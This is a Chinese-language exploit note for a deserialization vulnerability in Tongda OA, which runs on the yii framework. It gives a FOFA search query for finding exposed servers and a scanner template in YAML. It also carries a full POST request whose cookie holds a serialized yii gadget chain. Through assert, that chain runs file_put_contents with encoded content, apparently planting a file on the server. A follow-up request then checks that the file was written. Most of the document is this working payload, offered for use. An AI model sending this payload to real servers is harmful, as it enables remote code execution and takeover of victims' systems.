# 通达OA yii 前台反序列化漏洞

    https://mp.weixin.qq.com/s/nOQuqt_mO0glY-KALc1Xiw

## fofa

```
body="javascript:document.form1.UNAME.focus()"|| (body="OA提示：不能登录OA" && body="紧急通知：今日10点停电") || title="Office Anywhere 2017"|| body="url:'/general/login_code_check.php'" || (body="tongda.ico" && (title="OA" || title="办公"))
```



## exp

```go
detail:
  ID: 4705
  Author: joinia
  Name: 通达OA前台反序列化漏洞
  Description: 通达OA是由北京通达信科科技有限公司研发的一款通用型OA产品，涵盖了个人事务、行政办公、流程审批、知识管理、人力资源管理、组织机构管理等企业信息化管理功能。该应用使用的yii框架存在反序列化漏洞，攻击者可以利用该漏洞上传恶意文件，获取服务器权限。
  Identifier:
    DVB: DVB-2023-4705
  VulnClass:
  - 反序列化漏洞
  - 任意文件上传
  Category:
  - 应用服务
  Manufacturer: 通达信科
  Product: 通达OA
  Type: 1
  Status: 1
  Scanable: 1
  Level: 4
  DisclosureDate: '2023-07-10'
  Is0day: true
  IncludeExp: false
  Weakable: false
  IsXc: false
  IsCommon: false
  IsCallBack: false
  Condition: body="javascript:document.form1.UNAME.focus()"|| (body="OA提示：不能登录OA"
    && body="紧急通知：今日10点停电") || title="Office Anywhere 2017"|| body="url:'/general/login_code_check.php'"
    || (body="tongda.ico" && (title="OA" || title="办公"))
  Solutions:
  - 请关注厂商的修复版本，并及时更新到最新版本.
poc:
  relative: req0 && req1
  session: false
  requests:
  - method: POST
    timeout: 10
    path: /general/appbuilder/web/portal/gateway/?
    headers:
      User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like
        Gecko) Chrome/89.0.2387.92 Safari/537.36
      Cookie: _GET=f8e5e60742c33b6493815f3e763b0491269e30bb3cb1ff546986c609f99b207aO%3A23%3A%22yii%5Cdb%5CBatchQueryResult%22%3A8%3A%7Bs%3A2%3A%22db%22%3BN%3Bs%3A5%3A%22query%22%3BN%3Bs%3A9%3A%22batchSize%22%3Bi%3A100%3Bs%3A4%3A%22each%22%3Bb%3A0%3Bs%3A36%3A%22%00yii%5Cdb%5CBatchQueryResult%00_dataReader%22%3BO%3A17%3A%22yii%5Cdb%5CDataReader%22%3A4%3A%7Bs%3A29%3A%22%00yii%5Cdb%5CDataReader%00_statement%22%3BO%3A20%3A%22yii%5Credis%5CConnection%22%3A11%3A%7Bs%3A8%3A%22hostname%22%3Bs%3A9%3A%22127.0.0.1%22%3Bs%3A4%3A%22port%22%3Bi%3A135%3Bs%3A10%3A%22unixSocket%22%3BN%3Bs%3A8%3A%22password%22%3BN%3Bs%3A8%3A%22database%22%3BN%3Bs%3A17%3A%22connectionTimeout%22%3BN%3Bs%3A11%3A%22dataTimeout%22%3BN%3Bs%3A13%3A%22redisCommands%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A12%3A%22CLOSE+CURSOR%22%3B%7Ds%3A29%3A%22%00yii%5Credis%5CConnection%00_socket%22%3Bb%3A0%3Bs%3A27%3A%22%00yii%5Cbase%5CComponent%00_events%22%3Ba%3A1%3A%7Bs%3A9%3A%22afterOpen%22%3Ba%3A1%3A%7Bi%3A0%3Ba%3A2%3A%7Bi%3A0%3Ba%3A2%3A%7Bi%3A0%3BO%3A21%3A%22yii%5Crest%5CCreateAction%22%3A2%3A%7Bs%3A11%3A%22checkAccess%22%3Bs%3A6%3A%22assert%22%3Bs%3A2%3A%22id%22%3Bs%3A1366%3A%22file_put_contents%28td_authcode%28%27c9066idpU3LapxFv%2FEIOat11FnExsaNDHYRI6apb32BdYN5n9ldjc%2Fc3dKcWJp4%27%2C%27DECODE%27%2C+%271234567890%27%2C+%27%27%29%2Ctd_authcode%28%27c0f8F3SdvZ29CaBP0cEreJINtwOEVNH0t%2Fj3awvryrmDvBOiH7ECj%2F3KEHHAQtzdXWKSaC17FWbCDJVBRpBNwZiWAC63ACHX5oG5US5ZSK1ky%2B%2Fyi9Ua4EgZmJ%2F2nYryZwfUGhGyUArCtx1tOcIStL0krmsydoveWwhBy%2B289ra3DpuKi1M%2BotTgp60GTeIkKH9ZdzMSOyjdhXNIQv38jgtmIiwkI1CxxdjMDyowDoOwwl3iFd4IOFzJhrU9MLl907cu6GnC7dM9SC5bf4Knp0vwilfoE3QFACzu%2FJs16YEQpPdNxC%2BNOT867Z1P74g7sP6wxW5glkDXSm5s%2BVvUhw5gfsNGNotql%2BnzpTGoSTPAppBaN0htU1Ka3L5F0OztWt9KUFpvSfdnEETeb01eCMUfOvXAEIK43ptSNGUVTw4SgrqE0NFOZlmldmDABy%2FiZSxa%2B0uabNcI9Q7TGMzsGj0Rp6Y2zaxErgiX6N4mMG4jXMZkMmNvPvhdR63m8O8d1I6gsb6Lrdk62XcgDN3I%2FXaoZJIh5RhFMhWdb%2FiAKmw%2BWL21MEs7Ip8Hu0j1br9R0ePLAMUeLphXpdBV5Fm5AiNn%2BBK6Ornu%2FFFrAwV6R1oyu1E%2Fef52I8KCtPvCapAVQrHlxjV0b957hNCjwIEqpRyi1Se5IapaQidERhACAoAob5gCr7bspSmrGxGczRjpwGpuyNmB%2Bw55MUsKKmeFOWPOZCGXDIqUyzZU47ZcZyjmptlAiq%2B4ZsXuPZYU9nH7eysgAGBj2hjJC7OR0U3Td54JZUteT8IP4AYZwxEW0oZfld4Fr7MUFtIib5mqSaDJRWNOc1YIkDxdXtFntGtnL7qLlzBdIT6xRbCXquuQW3YBnlWdg5NWjyyy1NHCwjHkHCaUYnyR%2BWE2mOj4HkZtS0uBq%2BYl4Pb2M9Qz8unJVRV5ySn5GBRAZNOkF%2FWroNOdxvQsrWMGjVm8WFr0xc24tkd6urs8AeWDg%2B912%2FakS20r8Djhel78fScggK%2FIAAb9kL5a67tM8BC49ezQ36f7QS4hyoT4%2FEqYBo5AGCHHB%2FbqwMN%2F3H9W2cOK0XmN2m3rfebP5LyTrSWZeR9VMGaJXfcqxk0gypz%2BoCfc94U%2Ff4hqchQSYSBS50JR0R1Q8JxXv4zY6rwr5T4BiTg6VTLIDa12RJtW6zCWELll6eDxFb3xcko%27%2C%27DECODE%27%2C+%271234567890%27%2C+%27%27%29%29%22%3B%7Di%3A1%3Bs%3A3%3A%22run%22%3B%7Di%3A1%3Bs%3A1%3A%22a%22%3B%7D%7D%7Ds%3A30%3A%22%00yii%5Cbase%5CComponent%00_behaviors%22%3Bi%3A1%3B%7Ds%3A26%3A%22%00yii%5Cdb%5CDataReader%00_closed%22%3Bb%3A0%3Bs%3A23%3A%22%00yii%5Cdb%5CDataReader%00_row%22%3BN%3Bs%3A25%3A%22%00yii%5Cdb%5CDataReader%00_index%22%3Bi%3A-1%3B%7Ds%3A31%3A%22%00yii%5Cdb%5CBatchQueryResult%00_batch%22%3BN%3Bs%3A31%3A%22%00yii%5Cdb%5CBatchQueryResult%00_value%22%3BN%3Bs%3A29%3A%22%00yii%5Cdb%5CBatchQueryResult%00_key%22%3BN%3B%7D
      Content-Type: application/x-www-form-urlencoded
    follow_redirects: true
    matches: code.eq("500")
  - method: GET
    timeout: 10
    path: /logon.php
    headers:
      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36
        (KHTML, like Gecko) Chrome/60.0.1706.93 Safari/537.36
    follow_redirects: true
    matches: (code.eq("200") && body.leneq("0"))

```
